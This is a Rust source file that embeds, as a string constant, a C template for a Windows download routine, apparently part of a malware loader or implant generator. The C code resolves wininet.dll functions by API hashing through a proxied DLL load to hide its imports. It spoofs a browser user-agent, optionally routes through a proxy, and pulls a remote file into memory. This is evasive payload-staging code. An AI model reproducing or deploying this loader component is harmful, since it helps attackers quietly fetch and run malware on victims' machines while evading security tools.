pub const WEB_C: &str = r#"#include "web.h"
#include "macros.h"
#include "winapi.h"
#include <windows.h>

#define INTERNET_OPEN_TYPE_PRECONFIG 0
#define INTERNET_OPEN_TYPE_DIRECT 1
#define INTERNET_OPEN_TYPE_PROXY 3
#define INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY 4
#define INTERNET_FLAG_RELOAD 0x80000000

FARPROC pInternetOpenA;
FARPROC pInternetOpenUrlA;
FARPROC pInternetReadFile;
FARPROC pInternetCloseHandle;

int Download(char *url, char **file, int *size) {
    HMODULE hWininet = NULL;
    if (!pInternetOpenA || !pInternetOpenUrlA || !pInternetReadFile ||
        !pInternetCloseHandle) {
        if (!ProxyDllLoad("wininet.dll")) return 0;
        if ((hWininet = GetModuleHandleS(WININET_DLL_HASH)) == NULL) return 0;
        pInternetOpenA = GetProcAddressS(hWininet, INTERNETOPENA_HASH);
        pInternetOpenUrlA = GetProcAddressS(hWininet, INTERNETOPENURLA_HASH);
        pInternetReadFile = GetProcAddressS(hWininet, INTERNETREADFILE_HASH);
        pInternetCloseHandle =
            GetProcAddressS(hWininet, INTERNETCLOSEHANDLE_HASH);
#ifdef DEBUG
        PRINTA("[i] InternetOpenA : %p\n", pInternetOpenA);
        PRINTA("[i] InternetOpenUrlA : %p\n", pInternetOpenUrlA);
        PRINTA("[i] InternetReadFile : %p\n", pInternetReadFile);
        PRINTA("[i] InternetCloseHandle : %p\n", pInternetCloseHandle);
#endif
        if (!pInternetOpenA || !pInternetOpenUrlA || !pInternetReadFile ||
            !pInternetCloseHandle)
            return 0;
    }
#ifdef PROXY
    HINTERNET net = CALL(
        (InternetOpenA)(pInternetOpenA),
        "Mozilla/6.6 (Windows NT 6.6; WOW64) AppleWebKit/666.66 (KHTML, like "
        "Gecko) Chrome/66.0.6666.666 Safari/666.66",
        INTERNET_OPEN_TYPE_PROXY, PROXY_STRING, NULL, 0);
#else
    HINTERNET net = CALL(
        (InternetOpenA)(pInternetOpenA),
        "Mozilla/6.6 (Windows NT 6.6; WOW64) AppleWebKit/666.66 (KHTML, like "
        "Gecko) Chrome/66.0.6666.666 Safari/666.66",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
#endif

    if (net == NULL) goto __cleanup;
    HINTERNET connection =
        CALL((pInternetOpenUrlA), net, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (connection == NULL) goto __cleanup;

    int read = 0, reading = 0;
    char *flash, *buffer = NULL;
    *size = 0;

    if ((flash = (char *)malloc(1024)) == NULL) goto __cleanup;

    while (1) {

        if (!CALL((InternetReadFile)(pInternetReadFile), connection, flash,
                  1024, (LPDWORD)&reading))
            goto __cleanup;

        *size += reading;

        if (buffer == NULL)
            buffer = (char *)malloc(reading);
        else
            buffer = (char *)realloc(buffer, *size);

        if (!buffer) goto __cleanup;

        memcpy(buffer + (*size - reading), flash, reading);
        memset(flash, 0x00, reading);

        if (reading < 1024) break;
    }
    *file = buffer;
__cleanup:
    if (connection)
        CALL((InternetCloseHandle)(pInternetCloseHandle), connection);
    if (net) CALL((pInternetCloseHandle), net);
    free(flash);
    return (buffer != NULL) ? 1 : 0;
}

"#;